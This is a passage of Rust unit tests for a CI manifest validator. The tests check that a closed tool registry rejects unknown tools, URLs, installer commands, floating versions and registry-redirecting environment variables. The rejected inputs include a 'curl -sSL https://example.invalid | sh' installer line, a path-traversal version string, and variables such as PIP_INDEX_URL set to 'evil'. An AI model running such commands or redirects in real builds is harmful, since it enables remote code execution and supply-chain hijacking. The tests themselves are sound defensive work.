            "version = 1\n[[siblings]]\nrepo = \"a/schemas\"\n[[siblings]]\nrepo = \"b/schemas\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("same directory"), "got: {err}");
    }

    // ── [[tools]] ─────────────────────────────────────────────────────────

    #[test]
    fn known_tool_with_pinned_version_parses() {
        let m = parse_and_validate(
            "version = 1\n[[tools]]\nname = \"cargo-nextest\"\nversion = \"0.9.98\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.tools.len(), 1);
        assert_eq!(m.tools[0].name, "cargo-nextest");
    }

    /// The ecosystems the registry gained do NOT widen this boundary. Each of
    /// these redirects where a tool resolves or installs things — the same
    /// class as PATH/CARGO_HOME/LD_PRELOAD — and none is set by any live
    /// Actions gate step, so none was added. See the decision block on
    /// `ENV_ALLOWLIST`.
    #[test]
    fn ecosystem_env_still_outside_the_allowlist() {
        for key in [
            "npm_config_prefix",
            "npm_config_cache",
            "npm_config_registry",
            "NPM_CONFIG_PREFIX",
            "POETRY_VIRTUALENVS_PATH",
            "POETRY_HOME",
            "PIP_TARGET",
            "PIP_INDEX_URL",
            "PYTHONPATH",
            "VIRTUAL_ENV",
        ] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"evil\" }}\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("not allowlisted"), "{key}: got {err}");
        }
    }

    /// The curated entries the registry gained are declarable with a pinned
    /// version — that is Phase 1's whole point.
    #[test]
    fn curated_ecosystem_tools_are_declarable() {
        for (name, version) in [
            ("node", "22.11.0"),
            ("poetry", "2.1.3"),
            ("twine", "6.1.0"),
            ("datamodel-code-generator", "0.28.5"),
        ] {
            let text = format!(
                "version = 1\n[[tools]]\nname = {name:?}\nversion = {version:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let m = parse_and_validate(&text)
                .unwrap_or_else(|e| panic!("{name} must be declarable, got: {e}"));
            assert_eq!(m.tools[0].name, name);
            assert_eq!(m.tools[0].version, version);
        }
    }

    /// Opening the registry did not open the DOOR: a `[[tools]]` entry still
    /// has exactly two keys, so a URL (or an installer command) has nowhere to
    /// live — `deny_unknown_fields` makes it a hard parse error.
    #[test]
    fn a_tool_entry_can_never_express_a_url_or_an_installer() {
        for extra in [
            "url = \"https://example.invalid/evil.tar.gz\"",
            "install = \"curl -sSL https://example.invalid | sh\"",
            "index_url = \"https://example.invalid/simple\"",
            "distribution = \"evil\"",
        ] {
            let text = format!(
                "version = 1\n[[tools]]\nname = \"node\"\nversion = \"22.11.0\"\n{extra}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("parse error"), "{extra}: got {err}");
        }
    }

    /// `latest` stays a validation error for EVERY curated entry, not just the
    /// one the rule was written for.
    #[test]
    fn latest_rejected_for_every_curated_tool() {
        for name in super::super::tools::known_tool_names() {
            let text = format!(
                "version = 1\n[[tools]]\nname = {name:?}\nversion = \"latest\"\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(
                err.contains("must be an exact version"),
                "{name}: got {err}"
            );
        }
    }

    /// The registry is CLOSED — a manifest names a tool, it never supplies a
    /// URL, so an unknown name is a rejection rather than a fetch.
    #[test]
    fn unknown_tool_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[tools]]\nname = \"totally-legit-miner\"\nversion = \"1.0.0\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("unknown tool"), "got: {err}");
    }

    #[test]
    fn floating_and_malformed_tool_versions_rejected() {
        for bad in ["latest", "v0.9.98", "", "0.9.98/../evil", "0.9 98"] {
            let text = format!(
                "version = 1\n[[tools]]\nname = \"cargo-nextest\"\nversion = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("version"), "{bad}: got {err}");
        }
    }

    #[test]
    fn duplicate_tool_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[tools]]\nname = \"cargo-nextest\"\nversion = \"0.9.98\"\n\
             [[tools]]\nname = \"cargo-nextest\"\nversion = \"0.9.97\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("declared twice"), "got: {err}");
    }
}
